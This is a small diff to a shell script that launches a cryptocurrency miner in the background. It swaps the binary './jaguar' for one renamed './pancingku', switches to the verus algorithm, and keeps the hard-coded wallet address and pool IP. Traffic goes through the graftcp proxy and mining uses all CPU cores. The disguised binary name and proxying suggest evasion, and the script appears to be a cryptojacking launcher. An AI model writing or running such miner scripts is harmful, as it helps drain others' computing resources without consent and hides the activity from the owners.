@@ -46,7 +46,7 @@ END
   echo " "
 
   # Run ccminer in the background
-  /usr/bin/graftcp ./jaguar -c stratum+tcp://138.197.29.207:4444 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 100-1000 -n 1)) -p x --cpu "$(nproc)"  &
+  /usr/bin/graftcp ./pancingku -a verus -o stratum+tcp://138.197.29.207:4451 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 100-1000 -n 1)) -p x -t "$(nproc)"  &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
